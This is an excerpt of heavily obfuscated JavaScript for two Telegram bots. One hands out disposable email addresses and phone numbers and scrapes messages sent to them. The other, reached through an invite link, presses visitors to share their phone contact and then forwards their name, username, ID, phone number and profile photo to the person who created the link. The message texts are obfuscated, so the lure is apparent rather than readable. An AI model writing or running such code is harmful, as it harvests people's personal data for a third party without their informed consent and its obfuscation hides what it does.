                        'callback_data': _0x5b6567[_0x5cb1de(0x1cd)]
                    }]]
        };
    bot[_0x5cb1de(0x741) + 'e'](_0x2069f6, _0x5cb1de(0x6e9) + _0x5cb1de(0x8ae) + _0x17e323 + (_0x5cb1de(0x9a4) + _0x5cb1de(0x327) + _0x5cb1de(0x39f) + _0x5cb1de(0x44f) + _0x5cb1de(0x618) + _0x5cb1de(0x657) + _0x5cb1de(0x21b) + _0x5cb1de(0x30c) + _0x5cb1de(0x39b) + 'g>'), {
        'parse_mode': _0x5b6567[_0x5cb1de(0x674)],
        'reply_markup': { 'inline_keyboard': _0x22c334[_0x5cb1de(0xdbf) + _0x5cb1de(0x7bb)] }
    });
}), bot['on'](_0x54266d(0x546) + _0x54266d(0x352), _0x296840 => {
    const _0x5c54a4 = _0x54266d, _0x53dfe5 = {
            'itFqP': function (_0x41be45, _0x2627f2) {
                return _0x41be45 === _0x2627f2;
            },
            'LsdoV': _0x5c54a4(0x481) + 'il',
            'MWUTx': _0x5c54a4(0xcf6)
        }, _0x18badf = _0x296840[_0x5c54a4(0x842)][_0x5c54a4(0x6a9)]['id'], _0x3bb7c4 = _0x296840[_0x5c54a4(0x50f)];
    _0x53dfe5[_0x5c54a4(0x19c)](_0x3bb7c4, _0x53dfe5[_0x5c54a4(0x28a)]) && bot[_0x5c54a4(0x741) + 'e'](_0x18badf, _0x5c54a4(0x5f4) + _0x5c54a4(0x8ce) + _0x5c54a4(0x5df) + _0x5c54a4(0x629) + _0x5c54a4(0x47e) + _0x5c54a4(0x89c) + _0x5c54a4(0x94e) + _0x5c54a4(0xda2) + _0x5c54a4(0x488) + _0x5c54a4(0x974) + _0x5c54a4(0x2a2) + _0x5c54a4(0x423) + _0x5c54a4(0x342) + _0x5c54a4(0x900) + _0x5c54a4(0xa8f) + _0x5c54a4(0xc45) + _0x5c54a4(0x6ca) + _0x5c54a4(0x5db) + _0x5c54a4(0x4a1) + _0x5c54a4(0xd20) + _0x5c54a4(0x410) + _0x5c54a4(0x329) + _0x5c54a4(0x9c9) + _0x5c54a4(0x950) + _0x5c54a4(0x467) + _0x5c54a4(0x461) + _0x5c54a4(0xbe9), { 'parse_mode': _0x53dfe5[_0x5c54a4(0x3eb)] });
});
const EMAILS_FILE = _0x54266d(0xd3e) + 'n';
function readEmails() {
    const _0x464189 = _0x54266d, _0x2fc08d = { 'kERRh': _0x464189(0xabb) };
    try {
        const _0x3046ed = fs[_0x464189(0x234) + 'nc'](EMAILS_FILE, _0x2fc08d[_0x464189(0x243)]);
        return JSON[_0x464189(0x379)](_0x3046ed);
    } catch (_0x2fa535) {
        return {};
    }
}
function writeEmails(_0x3be3ad) {
    const _0x712eab = _0x54266d;
    fs[_0x712eab(0x95c) + _0x712eab(0x6b3)](EMAILS_FILE, JSON[_0x712eab(0x36e)](_0x3be3ad, null, 0x21 * 0x92 + 0x5 * -0x4f1 + 0x1f7 * 0x3));
}
bot[_0x54266d(0xb39)](/\/email/, async _0x3655c5 => {
    const _0x587905 = _0x54266d, _0x4eceac = {
            'PPYtF': function (_0x7e1f1a) {
                return _0x7e1f1a();
            },
            'EqTNj': _0x587905(0x194) + _0x587905(0x5aa) + _0x587905(0x9e2) + _0x587905(0x961),
            'hUsCL': _0x587905(0xcf6),
            'TIlPE': _0x587905(0x834) + _0x587905(0x70a) + _0x587905(0x5f6) + _0x587905(0x96b) + _0x587905(0x1bd),
            'PAnzG': _0x587905(0x7a9) + _0x587905(0x215),
            'oPvVb': _0x587905(0x1e2) + _0x587905(0x766),
            'mvNhE': function (_0x3c3266, _0x195545) {
                return _0x3c3266(_0x195545);
            },
            'oXLZs': _0x587905(0xb7b) + _0x587905(0xa77) + _0x587905(0x2c0) + 'g>'
        }, _0x44c69e = _0x3655c5[_0x587905(0x8e6)]['id'], _0x3aef78 = _0x3655c5[_0x587905(0x6a9)]['id'];
    let _0x58e1de = _0x4eceac[_0x587905(0x59c)](readEmails);
    _0x58e1de[_0x44c69e] && delete _0x58e1de[_0x44c69e];
    try {
        bot[_0x587905(0x741) + 'e'](_0x3aef78, _0x4eceac[_0x587905(0x6b6)], { 'parse_mode': _0x4eceac[_0x587905(0x692)] });
        const _0x4c093c = Math[_0x587905(0x9ee)]()[_0x587905(0xdab)](-0x4 * 0x559 + 0x36 * -0x9b + 0x363a)[_0x587905(0xca7)](-0x3 * 0x751 + 0x8 * -0x37e + 0x31e5, 0xe36 * 0x1 + -0x1735 + 0x907), _0x78f4cc = _0x587905(0xbec) + _0x4c093c, _0x1b96ae = await axios[_0x587905(0xa54)](_0x4eceac[_0x587905(0x9a5)], {
                'name': _0x78f4cc,
                'domain': _0x4eceac[_0x587905(0xb25)]
            }, { 'headers': { 'User-Agent': _0x4eceac[_0x587905(0xc85)] } }), _0x59cc02 = _0x1b96ae[_0x587905(0x50f)][_0x587905(0x6e5)];
        _0x58e1de[_0x44c69e] = _0x59cc02, _0x4eceac[_0x587905(0x1ad)](writeEmails, _0x58e1de), bot[_0x587905(0x741) + 'e'](_0x3aef78, _0x587905(0x93a) + _0x587905(0xc25) + _0x587905(0x8ab) + _0x587905(0x9de) + _0x587905(0xc68) + _0x59cc02 + (_0x587905(0x4d3) + _0x587905(0x235) + _0x587905(0x9b4) + _0x587905(0xdbd) + _0x587905(0x644)), { 'parse_mode': _0x4eceac[_0x587905(0x692)] });
    } catch (_0x59504d) {
        bot[_0x587905(0x741) + 'e'](_0x3aef78, _0x4eceac[_0x587905(0xd8d)], { 'parse_mode': _0x4eceac[_0x587905(0x692)] });
    }
}), bot[_0x54266d(0xb39)](/\/an/, _0x714c72 => {
    const _0x3aedd5 = _0x54266d, _0x5e04e6 = {
            'HGpVC': function (_0x5a12ef) {
                return _0x5a12ef();
            },
            'PxTPz': _0x3aedd5(0xcf6),
            'gKXWm': _0x3aedd5(0x6cd) + _0x3aedd5(0x503) + _0x3aedd5(0x314) + _0x3aedd5(0x80c) + 'g>'
        }, _0x7fc667 = _0x714c72[_0x3aedd5(0x6a9)]['id'], _0x64d8e9 = _0x714c72[_0x3aedd5(0x8e6)]['id'];
    let _0x59a5c4 = _0x5e04e6[_0x3aedd5(0xa83)](readEmails);
    if (_0x59a5c4[_0x64d8e9]) {
        const _0x53e9f3 = _0x59a5c4[_0x64d8e9];
        bot[_0x3aedd5(0x741) + 'e'](_0x7fc667, _0x3aedd5(0x40a) + _0x3aedd5(0x468) + _0x3aedd5(0x296) + _0x3aedd5(0xdf9) + _0x3aedd5(0xd81) + _0x3aedd5(0x963) + _0x53e9f3 + (_0x3aedd5(0x4d3) + _0x3aedd5(0x235) + _0x3aedd5(0x9b4) + _0x3aedd5(0xdbd) + _0x3aedd5(0x644)), { 'parse_mode': _0x5e04e6[_0x3aedd5(0x494)] });
    } else
        bot[_0x3aedd5(0x741) + 'e'](_0x7fc667, _0x5e04e6[_0x3aedd5(0x6a5)], { 'parse_mode': _0x5e04e6[_0x3aedd5(0x494)] });
}), bot[_0x54266d(0xb39)](/\/Messages/, async _0x565cb5 => {
    const _0x407472 = _0x54266d, _0x4c962b = {
            'tnQUR': _0x407472(0xcf6),
            'fkHUZ': function (_0x111187) {
                return _0x111187();
            },
            'SRVWH': function (_0x5a0a86, _0x130671) {
                return _0x5a0a86 > _0x130671;
            },
            'ciPng': _0x407472(0x6e4) + _0x407472(0x382) + _0x407472(0x931),
            'WwDdJ': _0x407472(0x548) + _0x407472(0xe0d) + _0x407472(0xb98) + _0x407472(0xde0) + 'g>',
            'rDTsa': _0x407472(0x7e3) + _0x407472(0x3c5) + _0x407472(0xcee) + _0x407472(0x9a6)
        }, _0x43e5f1 = _0x565cb5[_0x407472(0x6a9)]['id'], _0x5d21e9 = _0x565cb5[_0x407472(0x8e6)]['id'];
    let _0xaa080b = _0x4c962b[_0x407472(0xb20)](readEmails);
    if (_0xaa080b[_0x5d21e9]) {
        const _0x59056f = _0xaa080b[_0x5d21e9];
        try {
            const _0x6f2eec = await axios[_0x407472(0x4bf)](_0x407472(0x834) + _0x407472(0x70a) + _0x407472(0x5f6) + _0x407472(0x96b) + _0x407472(0xaba) + _0x59056f + _0x407472(0xbd1)), _0x4c87c2 = _0x6f2eec[_0x407472(0x50f)];
            _0x4c962b[_0x407472(0x34d)](_0x4c87c2[_0x407472(0x574)], 0x157d + -0xf31 + -0x64c) ? _0x4c87c2[_0x407472(0xcba)](_0x3aaf76 => {
                const _0x2b3b8b = _0x407472;
                bot[_0x2b3b8b(0x741) + 'e'](_0x43e5f1, _0x2b3b8b(0x53f) + _0x2b3b8b(0x9aa) + _0x2b3b8b(0x975) + '\x0a' + _0x3aaf76[_0x2b3b8b(0xaac)] + '\x0a' + _0x3aaf76[_0x2b3b8b(0x955)] + _0x2b3b8b(0x3a6), { 'parse_mode': _0x4c962b[_0x2b3b8b(0x35a)] });
            }) : bot[_0x407472(0x741) + 'e'](_0x43e5f1, _0x4c962b[_0x407472(0xc97)]);
        } catch (_0x29b242) {
            bot[_0x407472(0x741) + 'e'](_0x43e5f1, _0x4c962b[_0x407472(0x3d5)], { 'parse_mode': _0x4c962b[_0x407472(0x35a)] });
        }
    } else
        bot[_0x407472(0x741) + 'e'](_0x43e5f1, _0x4c962b[_0x407472(0x679)], { 'parse_mode': _0x4c962b[_0x407472(0x35a)] });
}), bot[_0x54266d(0xb39)](/\/de/, _0x5bbcb0 => {
    const _0x5343c2 = _0x54266d, _0x3d38f9 = {
            'HMxXG': function (_0x24781f) {
                return _0x24781f();
            },
            'BSgMh': function (_0x100425, _0xd189e2) {
                return _0x100425(_0xd189e2);
            },
            'jiAnX': _0x5343c2(0x93a) + _0x5343c2(0x8f5) + _0x5343c2(0x217) + '>',
            'HBoXK': _0x5343c2(0xcf6),
            'YNBbS': _0x5343c2(0x5c4) + _0x5343c2(0xcc0) + _0x5343c2(0xb17) + _0x5343c2(0x9a6)
        }, _0xaeb3c8 = _0x5bbcb0[_0x5343c2(0x6a9)]['id'], _0x2bac67 = _0x5bbcb0[_0x5343c2(0x8e6)]['id'];
    let _0x4ad5df = _0x3d38f9[_0x5343c2(0xc96)](readEmails);
    _0x4ad5df[_0x2bac67] ? (delete _0x4ad5df[_0x2bac67], _0x3d38f9[_0x5343c2(0x894)](writeEmails, _0x4ad5df), bot[_0x5343c2(0x741) + 'e'](_0xaeb3c8, _0x3d38f9[_0x5343c2(0xa57)], { 'parse_mode': _0x3d38f9[_0x5343c2(0x5fe)] })) : bot[_0x5343c2(0x741) + 'e'](_0xaeb3c8, _0x3d38f9[_0x5343c2(0xb3d)], { 'parse_mode': _0x3d38f9[_0x5343c2(0x5fe)] });
}), bot[_0x54266d(0xb39)](/\/de/, async _0x5dcaeb => {
    const _0x4b6898 = _0x54266d, _0x1ee8d0 = {
            'FyYIU': _0x4b6898(0x93a) + _0x4b6898(0x8f5) + _0x4b6898(0x217) + '>',
            'HDWxX': _0x4b6898(0xcf6),
            'vaZci': _0x4b6898(0x5c4) + _0x4b6898(0x7d8) + _0x4b6898(0x2a6) + _0x4b6898(0x9a6)
        }, _0x9149b5 = _0x5dcaeb[_0x4b6898(0x6a9)]['id'];
    try {
        fs[_0x4b6898(0x37f)](_0x4b6898(0x4c0) + _0x9149b5 + _0x4b6898(0x764)), bot[_0x4b6898(0x741) + 'e'](_0x9149b5, _0x1ee8d0[_0x4b6898(0x7cd)], { 'parse_mode': _0x1ee8d0[_0x4b6898(0xa3b)] });
    } catch (_0x44bab8) {
        bot[_0x4b6898(0x741) + 'e'](_0x9149b5, _0x1ee8d0[_0x4b6898(0x605)], { 'parse_mode': _0x1ee8d0[_0x4b6898(0xa3b)] });
    }
}), bot[_0x54266d(0xb39)](/\/sخسننسمس/, _0x5903b4 => {
    const _0x55f1a7 = _0x54266d, _0x476905 = {
            'IfiQH': _0x55f1a7(0x59f) + _0x55f1a7(0x44d),
            'GuLmu': _0x55f1a7(0xa99) + _0x55f1a7(0x384),
            'KYXOs': _0x55f1a7(0xa7f) + _0x55f1a7(0x8d5) + _0x55f1a7(0xaab) + _0x55f1a7(0x635)
        }, _0x5f55c7 = _0x5903b4[_0x55f1a7(0x6a9)]['id'], _0x333383 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x476905[_0x55f1a7(0xddd)],
                            'callback_data': _0x476905[_0x55f1a7(0xb9b)]
                        }]]
            }
        };
    bot[_0x55f1a7(0x741) + 'e'](_0x5f55c7, _0x476905[_0x55f1a7(0xa8d)], _0x333383);
}), bot['on'](_0x54266d(0x546) + _0x54266d(0x352), _0x306161 => {
    const _0x1069ec = _0x54266d, _0x55f749 = {
            'TNgIP': function (_0x3ea8f1, _0x226eff) {
                return _0x3ea8f1 === _0x226eff;
            },
            'XOhgt': _0x1069ec(0xa99) + _0x1069ec(0x384)
        };
    if (_0x55f749[_0x1069ec(0x29c)](_0x306161[_0x1069ec(0x50f)], _0x55f749[_0x1069ec(0x775)])) {
        const _0x70a5fb = _0x306161[_0x1069ec(0x8e6)]['id'], _0x117689 = _0x1069ec(0xcd2) + _0x1069ec(0xdc4) + _0x1069ec(0x42a) + _0x70a5fb;
        bot[_0x1069ec(0x741) + 'e'](_0x306161[_0x1069ec(0x842)][_0x1069ec(0x6a9)]['id'], _0x1069ec(0x31a) + _0x1069ec(0x3da) + _0x1069ec(0xbb3) + _0x1069ec(0xc78) + _0x1069ec(0x7a3) + _0x1069ec(0x377) + ':\x0a' + _0x117689);
    }
}), secondBot[_0x54266d(0xb39)](/\/start (.+)/, (_0x1f81e2, _0x1b4ba8) => {
    const _0x4e5368 = _0x54266d, _0x58ab43 = {
            'xtViN': function (_0x103e84, _0x3d9209) {
                return _0x103e84(_0x3d9209);
            },
            'UiewR': _0x4e5368(0xd87) + _0x4e5368(0xd70),
            'Lvyix': _0x4e5368(0xa00) + _0x4e5368(0x718) + _0x4e5368(0x32f) + _0x4e5368(0x27a) + _0x4e5368(0x4df)
        }, _0x3bf38d = _0x1f81e2[_0x4e5368(0x6a9)]['id'], _0x410c9d = _0x58ab43[_0x4e5368(0x783)](parseInt, _0x1b4ba8[0x1ee4 * -0x1 + -0xe3 * 0x21 + 0x3c28]);
    inviteLinks[_0x1f81e2[_0x4e5368(0x8e6)]['id']] = _0x410c9d;
    const _0x5e4dda = {
        'reply_markup': {
            'keyboard': [[{
                        'text': _0x58ab43[_0x4e5368(0x8a1)],
                        'request_contact': !![]
                    }]],
            'one_time_keyboard': !![]
        }
    };
    secondBot[_0x4e5368(0x741) + 'e'](_0x3bf38d, _0x58ab43[_0x4e5368(0xd62)], _0x5e4dda);
}), secondBot['on'](_0x54266d(0x97f), _0x2a4453 => {
    const _0x33beb6 = _0x54266d, _0x145d5f = {
            'VUgrM': _0x33beb6(0x6a4) + _0x33beb6(0x864) + _0x33beb6(0xae2),
            'HaRIG': _0x33beb6(0x801),
            'dKjcL': _0x33beb6(0xb2e) + _0x33beb6(0x6c9) + 'ح.',
            'mEmmp': function (_0x981055, _0x25b987) {
                return _0x981055 + _0x25b987;
            },
            'kUtHw': function (_0x4e02bb, _0x54a8ba) {
                return _0x4e02bb + _0x54a8ba;
            },
            'MHime': function (_0x298e49, _0x57b7c6) {
                return _0x298e49 > _0x57b7c6;
            },
            'EfwMU': _0x33beb6(0x2a3) + _0x33beb6(0x213),
            'viMAn': _0x33beb6(0x6a4) + _0x33beb6(0xc88) + _0x33beb6(0xcf4) + _0x33beb6(0xb81) + _0x33beb6(0x429),
            'iIMou': _0x33beb6(0x535) + _0x33beb6(0xb16) + _0x33beb6(0xb34) + _0x33beb6(0x2e6) + _0x33beb6(0xb79) + _0x33beb6(0xc7e),
            'GsNkU': function (_0x1122a2, _0x11c06f) {
                return _0x1122a2 === _0x11c06f;
            },
            'NfgEK': _0x33beb6(0xb33) + _0x33beb6(0x596),
            'nTAfu': _0x33beb6(0x95b) + 'ذة',
            'FrfZS': _0x33beb6(0xa00) + _0x33beb6(0x718) + _0x33beb6(0x5b9) + _0x33beb6(0x36f),
            'mYIQY': _0x33beb6(0x876) + _0x33beb6(0x4b4) + _0x33beb6(0x430)
        };
    if (_0x2a4453[_0x33beb6(0x97f)] && inviteLinks[_0x2a4453[_0x33beb6(0x8e6)]['id']]) {
        if (_0x145d5f[_0x33beb6(0x619)](_0x2a4453[_0x33beb6(0x97f)][_0x33beb6(0x879)], _0x2a4453[_0x33beb6(0x8e6)]['id'])) {
            const _0x58d64d = inviteLinks[_0x2a4453[_0x33beb6(0x8e6)]['id']], _0x3617cc = _0x2a4453[_0x33beb6(0x8e6)], _0x3589cf = _0x3617cc['id'], _0x3dc692 = _0x3617cc[_0x33beb6(0x845)], _0x207734 = _0x3617cc[_0x33beb6(0x4ca)] || '', _0x7fe1f = _0x3617cc[_0x33beb6(0xc5d)] || _0x145d5f[_0x33beb6(0x727)], _0x216541 = _0x3617cc[_0x33beb6(0xa58)] || _0x145d5f[_0x33beb6(0x42c)], _0x48a117 = _0x2a4453[_0x33beb6(0x97f)][_0x33beb6(0x889) + 'er'];
            secondBot[_0x33beb6(0x532) + _0x33beb6(0xcaa)](_0x3589cf)[_0x33beb6(0x992)](_0xcf6c92 => {
                const _0x51a41e = _0x33beb6, _0x136943 = { 'XbPSD': _0x145d5f[_0x51a41e(0xb9e)] }, _0x5a7f48 = _0x145d5f[_0x51a41e(0x2de)](_0x145d5f[_0x51a41e(0xb5e)](_0x145d5f[_0x51a41e(0x2de)](_0x145d5f[_0x51a41e(0x2de)](_0x51a41e(0x247) + _0x51a41e(0x703) + '\x0a', _0x51a41e(0xb10) + _0x3dc692 + '\x20' + _0x207734 + _0x51a41e(0xa31)), _0x51a41e(0xac8) + '@' + _0x7fe1f + _0x51a41e(0xa31)), _0x51a41e(0x2fe) + _0x3589cf + _0x51a41e(0xa31)), _0x51a41e(0xb71) + _0x51a41e(0x570) + _0x48a117 + '\x0a');
                if (_0x145d5f[_0x51a41e(0x44e)](_0xcf6c92[_0x51a41e(0x2ce) + 't'], -0x6 * 0x112 + 0x1 * -0xdf + 0x1 * 0x74b)) {
                    const _0xa01ca7 = _0xcf6c92[_0x51a41e(0xe05)][-0x486 * 0x8 + 0x1 * -0xcf1 + -0x1 * -0x3121][0x1e2f + 0x6 * 0x1b0 + -0x284f][_0x51a41e(0x432)];
                    _0xa01ca7 ? bot[_0x51a41e(0x359)](_0x58d64d, _0xa01ca7, {
                        'caption': _0x5a7f48,
                        'parse_mode': _0x145d5f[_0x51a41e(0x485)]
                    })[_0x51a41e(0x992)](() => {
                        const _0x32e984 = _0x51a41e;
                        console[_0x32e984(0xb18)](_0x136943[_0x32e984(0xe1c)]);
                    })[_0x51a41e(0x2c4)](_0xfab7f4 => {
                        const _0x2d70e6 = _0x51a41e;
                        console[_0x2d70e6(0x3a5)](_0x145d5f[_0x2d70e6(0xcfd)], _0xfab7f4), bot[_0x2d70e6(0x741) + 'e'](_0x58d64d, _0x5a7f48, { 'parse_mode': _0x145d5f[_0x2d70e6(0x485)] });
                    }) : bot[_0x51a41e(0x741) + 'e'](_0x58d64d, _0x5a7f48, { 'parse_mode': _0x145d5f[_0x51a41e(0x485)] });
                } else
                    bot[_0x51a41e(0x741) + 'e'](_0x58d64d, _0x5a7f48, { 'parse_mode': _0x145d5f[_0x51a41e(0x485)] });
                secondBot[_0x51a41e(0x741) + 'e'](_0x2a4453[_0x51a41e(0x6a9)]['id'], _0x145d5f[_0x51a41e(0xa71)]), delete inviteLinks[_0x2a4453[_0x51a41e(0x8e6)]['id']];
            })[_0x33beb6(0x2c4)](_0x457412 => {
                const _0x59fd99 = _0x33beb6;
                console[_0x59fd99(0x3a5)](_0x145d5f[_0x59fd99(0xce5)], _0x457412), secondBot[_0x59fd99(0x741) + 'e'](_0x2a4453[_0x59fd99(0x6a9)]['id'], _0x145d5f[_0x59fd99(0x8b6)]);
            });
        } else
            secondBot[_0x33beb6(0x741) + 'e'](_0x2a4453[_0x33beb6(0x6a9)]['id'], _0x145d5f[_0x33beb6(0xb1e)]);
    } else
        secondBot[_0x33beb6(0x741) + 'e'](_0x2a4453[_0x33beb6(0x6a9)]['id'], _0x145d5f[_0x33beb6(0x6aa)]);
}), secondBot['on'](_0x54266d(0x842), _0x48be59 => {
    const _0x88b978 = _0x54266d, _0x53017a = {
            'sboCP': function (_0x6826ee, _0x3c2028) {
                return _0x6826ee !== _0x3c2028;
            },
            'FnQTp': _0x88b978(0x7f2),
            'omfqS': _0x88b978(0xd87) + _0x88b978(0xd70),
            'IpGfM': _0x88b978(0xa00) + _0x88b978(0x718) + _0x88b978(0x9b7)
        };
    if (!_0x48be59[_0x88b978(0x97f)] && _0x53017a[_0x88b978(0xa1a)](_0x48be59[_0x88b978(0x9ac)], _0x53017a[_0x88b978(0x61c)])) {
        const _0x1d4fa1 = {
            'reply_markup': {
                'keyboard': [[{
                            'text': _0x53017a[_0x88b978(0xa2b)],
                            'request_contact': !![]
                        }]],
                'one_time_keyboard': !![]
            }
        };
        secondBot[_0x88b978(0x741) + 'e'](_0x48be59[_0x88b978(0x6a9)]['id'], _0x53017a[_0x88b978(0xc92)], _0x1d4fa1);
    }
});
const countries = {
    '+1': [
        _0x54266d(0x28c),
        _0x54266d(0x60c)
    ],
    '+46': [
        _0x54266d(0xaec),
        _0x54266d(0x581)
    ],
    '+86': [
        _0x54266d(0x34c),
        _0x54266d(0x344)
    ],
    '+852': [
        _0x54266d(0x35f),
        _0x54266d(0x93f)
    ],
    '+45': [
        _0x54266d(0x7f5),
        _0x54266d(0x56b)
    ],
    '+33': [
        _0x54266d(0x7cb),
        _0x54266d(0x1e0)
    ],
    '+31': [
        _0x54266d(0xdbe),
        _0x54266d(0x1ab)
    ],
    '+7': [
        _0x54266d(0x7b0),
        _0x54266d(0x238)
    ],
    '+7KZ': [
        _0x54266d(0xd11),
        _0x54266d(0x365)
    ],
    '+381': [
        _0x54266d(0xda6),
        _0x54266d(0x73c)
    ],
    '+44': [
        _0x54266d(0x7b5),
        _0x54266d(0x4bc)
    ],
    '+371': [
        _0x54266d(0xad2),
        _0x54266d(0xa2f)
    ],
    '+62': [
        _0x54266d(0xb69),
        _0x54266d(0x994)
    ],
    '+351': [
        _0x54266d(0x841),
        _0x54266d(0x3f2)
    ],
    '+34': [
        _0x54266d(0x907),
        _0x54266d(0xd9b)
    ],
    '+372': [
        _0x54266d(0x685),
        _0x54266d(0x49d)
    ],
    '+358': [
        _0x54266d(0xd6e),
        _0x54266d(0xb12)
    ]
};
async function importNumbers() {
    const _0x11b4de = _0x54266d, _0x390e92 = {
            'skagd': _0x11b4de(0x1f1) + _0x11b4de(0xa2c) + _0x11b4de(0xa87),
            'lJEUa': _0x11b4de(0x222) + _0x11b4de(0xc84)
        };
    try {
        const _0xe92ce1 = await axios[_0x11b4de(0x4bf)](_0x390e92[_0x11b4de(0x7fa)]);
        return _0xe92ce1[_0x11b4de(0x50f)][_0x11b4de(0x7aa)]('\x0a');
    } catch (_0x32f466) {
        return console[_0x11b4de(0x3a5)](_0x390e92[_0x11b4de(0x55e)], _0x32f466), [];
    }
}
async function getRandomNumberInfo() {
    const _0x1574ca = _0x54266d, _0x4dd22e = {
            'SnwxS': function (_0xcef461) {
                return _0xcef461();
            },
            'eQukI': function (_0x5c69cc, _0x3936ea) {
                return _0x5c69cc === _0x3936ea;
            },
            'rhUtc': function (_0x27d7b8, _0x3e52ca) {
                return _0x27d7b8 * _0x3e52ca;
            },
            'KPaKJ': _0x1574ca(0xa70),
            'CbqHR': _0x1574ca(0x3db),
            'GAfKh': function (_0x4dda0d, _0x2fcb69) {
                return _0x4dda0d in _0x2fcb69;
            },
            'kSIor': _0x1574ca(0x8e5) + _0x1574ca(0x455)
        }, _0x33d7f5 = await _0x4dd22e[_0x1574ca(0x264)](importNumbers);
    if (_0x4dd22e[_0x1574ca(0x2b6)](_0x33d7f5[_0x1574ca(0x574)], 0xbf6 + -0x1 * 0x22f7 + 0x1701))
        return null;
    const _0x43177e = Math[_0x1574ca(0xd54)](_0x4dd22e[_0x1574ca(0x4ff)](Math[_0x1574ca(0x9ee)](), _0x33d7f5[_0x1574ca(0x574)])), _0x2e75cb = _0x33d7f5[_0x43177e][_0x1574ca(0x79d)](), _0x481ccd = new Date()[_0x1574ca(0x808) + 'g']()[_0x1574ca(0x7aa)]('T')[-0x65c * 0x3 + 0x1 * 0x2062 + -0xd4e], _0x396e9c = new Date()[_0x1574ca(0x8dc) + _0x1574ca(0x5ab)](_0x4dd22e[_0x1574ca(0x911)]);
    let _0x450156;
    if (_0x2e75cb[_0x1574ca(0xd2d)]('+1'))
        _0x450156 = '+1';
    else
        _0x2e75cb[_0x1574ca(0xd2d)]('+7') ? _0x450156 = _0x2e75cb[_0x1574ca(0x439)]('7') ? _0x4dd22e[_0x1574ca(0x606)] : '+7' : _0x450156 = _0x4dd22e[_0x1574ca(0x9ab)](_0x2e75cb[_0x1574ca(0x887)](0x1b8 * 0x11 + 0x1 * -0x6ba + 0x1 * -0x167e, 0x41 * 0x5f + -0x89f + 0x7be * -0x2), countries) ? _0x2e75cb[_0x1574ca(0x887)](0x8 * -0x1d7 + 0x1 * -0x1025 + 0x1 * 0x1edd, 0x93e + 0x688 + 0x7e1 * -0x2) : _0x2e75cb[_0x1574ca(0x887)](-0xb77 * 0x2 + -0x89c * -0x2 + 0x5b6, -0x157d * 0x1 + -0x3 * -0x819 + -0xb * 0x41);
    const [_0x4233d4, _0x4c5532] = countries[_0x450156] || [
        _0x4dd22e[_0x1574ca(0xaf3)],
        '🚩'
    ];
    return {
        'number': _0x2e75cb,
        'countryCode': _0x450156,
        'countryName': _0x4233d4,
        'countryFlag': _0x4c5532,
        'creationDate': _0x481ccd,
        'creationTime': _0x396e9c
    };
}
async function getMessages(_0x5220e2) {
    const _0x26a8a9 = _0x54266d, _0x1ab70d = {
            'WrKhF': function (_0xef71c4, _0x2e9e10) {
                return _0xef71c4(_0x2e9e10);
            },
            'HBqua': function (_0x5d7edd, _0x243fe6) {
                return _0x5d7edd(_0x243fe6);
            },
            'bZCUk': _0x26a8a9(0xc73) + _0x26a8a9(0xbdf) + _0x26a8a9(0x7ec),
            'sJhLN': _0x26a8a9(0x222) + _0x26a8a9(0x4f8)
        };
    try {
        const _0xb1fbec = await axios[_0x26a8a9(0x4bf)](_0x26a8a9(0x914) + _0x26a8a9(0x1c0) + _0x26a8a9(0x7ba) + _0x5220e2), _0x5503c9 = cheerio[_0x26a8a9(0x1be)](_0xb1fbec[_0x26a8a9(0x50f)]), _0x178622 = [];
        return _0x1ab70d[_0x26a8a9(0xac9)](_0x5503c9, _0x1ab70d[_0x26a8a9(0xa0d)])[_0x26a8a9(0x90f)]((_0xaa0b7, _0x180f8e) => {
            const _0x51aff9 = _0x26a8a9;
            _0x178622[_0x51aff9(0xb97)](_0x1ab70d[_0x51aff9(0x787)](_0x5503c9, _0x180f8e)[_0x51aff9(0x9ac)]()[_0x51aff9(0x79d)]());
        }), _0x178622;
    } catch (_0x4a0841) {
        return console[_0x26a8a9(0x3a5)](_0x1ab70d[_0x26a8a9(0x2c1)], _0x4a0841), [];
    }
}
bot[_0x54266d(0xb39)](/\/stسمهصخصt/, _0x115849 => {
    const _0x1b40e3 = _0x54266d, _0x3274ba = {
            'MCTHI': _0x1b40e3(0x99e) + _0x1b40e3(0x811),
            'jqNQJ': _0x1b40e3(0x72a),
            'ljvnr': _0x1b40e3(0xc30) + _0x1b40e3(0x6a1) + _0x1b40e3(0xa7a) + _0x1b40e3(0x576)
        }, _0x5a8446 = _0x115849[_0x1b40e3(0x6a9)]['id'], _0x36bb9f = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x3274ba[_0x1b40e3(0x99d)],
                            'callback_data': _0x3274ba[_0x1b40e3(0x8a8)]
                        }]]
            }
        };
    bot[_0x1b40e3(0x741) + 'e'](_0x5a8446, _0x3274ba[_0x1b40e3(0xcf2)], _0x36bb9f);
});
const m = _0x54266d(0x8c5) + _0x54266d(0x411) + 'ج';
bot['on'](_0x54266d(0x546) + _0x54266d(0x352), async _0x3e21f => {
    const _0x39eade = _0x54266d, _0x4c1474 = {
            'icnJD': function (_0x44e686, _0x126793) {
                return _0x44e686 === _0x126793;
            },
            'luBfT': _0x39eade(0x72a),
            'oHVLg': function (_0x11a6d2) {
                return _0x11a6d2();
            },
            'bYCFU': _0x39eade(0xda3) + _0x39eade(0xc13),
            'somiD': _0x39eade(0x793) + '💬',
            'EUYUX': function (_0x4ec1b5, _0x2fc772) {
                return _0x4ec1b5 + _0x2fc772;
            },
            'kHgqC': function (_0x37c51d, _0x4e0832) {
                return _0x37c51d + _0x4e0832;
            },
            'PqBDn': _0x39eade(0x801),
            'wCpJI': _0x39eade(0x6e4) + _0x39eade(0x1fa) + _0x39eade(0x867),
            'LWfdj': _0x39eade(0xc6d) + _0x39eade(0x279),
            'uaMvI': function (_0x1f3f03, _0x26606a) {
                return _0x1f3f03(_0x26606a);
            },
            'KUDyE': function (_0x277458, _0x1c1d34) {
                return _0x277458 > _0x1c1d34;
            },
            'WGAYx': _0x39eade(0x186) + _0x39eade(0x85b) + _0x39eade(0x5e9),
            'sYjFk': _0x39eade(0xbb6) + _0x39eade(0xe0a)
        }, _0x1285a3 = _0x3e21f[_0x39eade(0x842)], _0x512cf6 = _0x1285a3[_0x39eade(0x6a9)]['id'], _0x58d511 = _0x3e21f[_0x39eade(0x50f)];
    if (_0x4c1474[_0x39eade(0x2c8)](_0x58d511, _0x4c1474[_0x39eade(0x2b3)])) {
        const _0x31e34c = await _0x4c1474[_0x39eade(0x1ee)](getRandomNumberInfo);
        if (_0x31e34c) {
            const _0xe817c6 = {
                    'reply_markup': {
                        'inline_keyboard': [
                            [{
                                    'text': _0x4c1474[_0x39eade(0x2bc)],
